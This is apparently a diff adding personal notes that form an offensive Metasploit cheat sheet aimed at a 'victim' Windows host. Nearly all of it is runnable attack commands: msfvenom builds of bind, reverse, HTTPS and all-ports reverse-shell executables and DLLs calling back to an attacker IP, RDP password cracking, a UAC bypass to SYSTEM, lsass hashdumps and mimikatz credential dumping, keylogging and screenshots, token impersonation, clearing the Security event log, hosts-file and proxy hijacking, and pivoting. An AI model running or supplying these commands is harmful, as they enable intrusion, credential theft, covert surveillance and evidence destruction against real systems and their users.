@@ -1,0 +1,245 @@
+  https://www.exploit-db.com/exploits/16806
+
+
+crack RDP logins:
+
+	ncrack -U rdp_user_list.txt -P rdp_pass_list.txt -p rdp 192.168.1.55
+
+
+
+Build a payload with a bind shell:
+	msfvenom -l payloads	-> displays all payloads available to the tool
+
+
+	Create an exe that is a listener
+		msfvenom -p windows/meterpreter/bind_tcp -a x86 -f exe > bind_shell.exe
+			-p	payload
+			-a	arcitecture
+			-f	file type
+
+		msvenom -p windows/meterpreter/bind_tcp -o will show options for the payload selected
+
+	Use Metasploit to connect to above listener
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/bind_tcp
+		set RHOSTS <ip of victom>
+		exploit
+
+
+			
+Build a payload with a reverse shell:
+	msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.1.184 LPORT=80 > reverse_shell.exe
+
+	create listner in Metasploit
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set LHOST <ip of listener>
+		set LPORT 80
+		exploit
+			
+	Wait for exe to be executed
+
+
+
+
+Build a payload with a reverse HTTPS Stager:
+	msfvenom -p windows/meterpreter/reverse_https -a x86 -f exe LHOST=192.168.1.184 LPORT=443 > reverse_https.exe
+		This mimics a normal https connection when ran
+
+	create listner in Metasploit
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_https
+		set LHOST <ip of listener>
+		set LPORT 443
+		exploit
+
+
+Build a payload with a reverse shell that tries all outbound ports from the victim
+	use IPtables to redirect all inbound traffic to our metasploit handler (iptables command may need fixing):
+		iptables -F
+		iptables -F -t nat
+		/sbin/modprobe ipt_MASQUERADE
+		echo "1" > /proc/sys/net/ipv4/ip_forward
+		iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
+		iptables -t nat -A PREROUTING -p tcp --dport 4444:6010 -j REDIRECT --to-port 4444 
+			--dport 4444:6010	-> listen on ports 4444 - 6010
+			--to-port 4444		-> redirect to handler on port 4444
+				
+	msfvenom -p windows/meterpreter/reverse_tcp_allports -a x86 -f exe LHOST=192.168.1.184 LPORT=4444 > reverse_allports.exe
+		LPORT=4444	-> port to try first and then increment up
+
+	Create listener in Metasploit
+		use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_tcp_allports
+		set LHOST <ip of listener>
+		set LPORT 4444
+		exploit
+
+
+
+Pivot through a meterpreter session on the victim to another host. 
+
+	Kali -> Victim -> New Host
+		New Host is not directly accessible
+
+	Acquire a meterpreter session in metasploit on a vulnerable 'victim' system
+	From Meterpreter session:
+		ps		-> find explorer.exe and migrate to it
+		migrate 2264
+		ipconfig	-> shows available interfaces
+		run post/windows/gather/arp_scanner RHOSTS=192.168.10.0/24
+			this shows available IPs on the remote network that is only accessible through the original victim
+
+		portfwd add -l 8000 -p 80 -r 192.168.10.1
+			-l 8000		-> local port where kali/metasploit is running
+			-p 80 		-> remote port to forward to
+			-r 192.168.0.1	-> ip of remote host we access through original victim
+		
+		much like ssh port forwarding, port 8000 is local on the Kali box.
+			can confirm this by doing: nmap -sV -p8000 localhost
+				returns the info about the http server on the 192.168.10.1 IP address	
+
+	
+
+		background	-> put the meterpreter session in the background
+		sessions 	-> see what "ID" the session is
+		route add 192.168.10.0 255.255.255.0 1
+			adds route for subnet to new host through meterpreter session 1
+
+	
+
+
+
+Metasploit Elevate Permissions of normal user to SYSTEM with bypass UAC exploit
+	Acquire a meterpreter session
+	background		-> put meterpreter session in background
+	sessions -l		-> see what "ID" the session id
+	
+	use exploit/windows/local/bypassuac
+	set SESSION <session id from above>
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	set LHOST 192.168.1.184	(ip of kali/metasploit)
+	exploit	(may have to run more than once)
+
+	getuid		-> should still show original user
+	getsystem	-> should move user to NT AUTHORITY\SYSTEM
+	getuid		-> should show the SYSTEM account
+
+	run post/windows/gather/smart_hashdump
+
+	hashdump 	-> running native hashdump should fail. Migrate to lsass.exe process
+	ps		-> get list of processes
+	migrate <lsass.exe id>
+	hashdump
+
+	(migrate to lsass.exe first and make sure you are SYSTEM account)
+	load kiwi	-> loads tools like mimikatz
+	creds_all	-> dumps wdigest creds / cached passwords
+
+
+Get a command prompt from a meterpreter session
+	execute -f cmd.exe -H -c -i
+		-H	-> Create the process hidden from view
+		-c	-> Channelized I/O (required for interaction)
+		-i	-> Interact with th eprocess after creating it.
+
+
+Sniffer inside of Meterpreter session
+	use sniffer	-> loads sniffer module
+	sniffer_interfaces	-> get list of sniffer interfaces
+	sniffer_start <interface id>	-> start sniffing on that interface
+	
+	sniffer_stats <interface id>	-> shows number of packets captured
+
+	sniffer_dump <interface id> filename.pcap	-> dump captured data to pcap
+	sniffer_stop <interface id>
+
+	open filename.pcap in wireshark
+
+
+
+Capture Keystrokes and screenshots in Meterpreter session
+	keyscan_start	-> start sniffing key strokes. Wait serveral minutes, etc.
+	keyscan_dump	-> dump keystokes that it has recored up to this point
+	keyscan_stop	-> stop sniffing
+
+	screenshot 	-> takes screenshot of desktop
+
+	uictl disable keyboard	-> disable users keyboard, can also enable them
+	uictl disable mouse	-> disable users mouse
+
+
+
+
+Impersonation in Meterpreter session
+	Need to be elevated to SYSTEM
+	load incognito
+	list_tokens -u		-> list username tokens
+		-g		-> list groupname tokens
+
+	impersonate_token <token>	-> i.e. impersonate_token windows7\\jimmy
+					-> 	windows7 is hostname jimmy is username
+					-> 	\\ slash is escaped
+
+
+wevtutil.exe	-> (windows event utility) utility for manageming logs
+	wevtuitl el	-> list all logs
+	
+	wevtutil gli Security	-> lists statics about the Security log
+
+	wevtutil qe Security /c:3 /rd:true /f:text	-> displays the Security logs
+		qe		-> query
+		Security	-> query the Security log
+		/c:3		-> display last 3 log entries
+		/rd:true	-> 
+		/f:text		-> display in text
+
+	wevtutil epl Security C:\sec.evtx 
+		epl	-> export
+
+	wevtutil cl Security	-> clear the security log
+
+
+WMIC (Windows Management Instrumentation) - best when elevated to SYSTEM
+	wmic useraccount list		-> list user accounts
+	wmic process list		-> list info about all processes
+	wmic process get Name,ProcessId	-> list only name and process id
+	wmic process list BRIEF		
+	wmic startup list brief		-> list programs to run at startup
+	wmic product get Name,Vendor	-> list products installed by Name and Vendor
+	wmic share list			-> list network shares
+	wmic group list brief		-> list groups 
+
+
+
+Configure proxy script (PAC file) on Windows victim via meterpreter
+	use post/windows/manage/ie_proxypac
+	set REMOTE_PAC http://<ip of kali webserver>/proxy.pac
+	set SESSION 1	-> session of where the user is the user you are attacking (Not SYSTEM)
+
+	exploit
+
+
+Modify Hosts file from meterpreter session
+	use post/windows/manage/inject_host
+		set DOMAIN www.google.com
+		set IP <ip of Kali box>
+		set SESSION <session id> 	-> meterpreter session number
+
+
+Run Meterpreter as a 32 or 64 bit DLL
+	32 bit:
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.184 LPORT=9000 -f dll -a x86 --platform windows > payload.dll
+		
+	64 bit:
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.184 LPORT=9000 -f dll -a x64 --platform windows > payload.dll
+
+	In order to test the above DLL we can use the rundll32.exe to launch the DLLs
+		64bit: C:\Windows\System32\rundll32.exe payload64.dll abcd
+		32-bit: C:\Windows\SysWOW64\rundll32.exe payload.dll abcd
+			the Function name must be given -> abcd is a made up function name that will work
+
+		Once you have the meterpreter session, run ps to see a list of processes. You should see rundll32.exe
+		getpid will confirm the number
+
+	
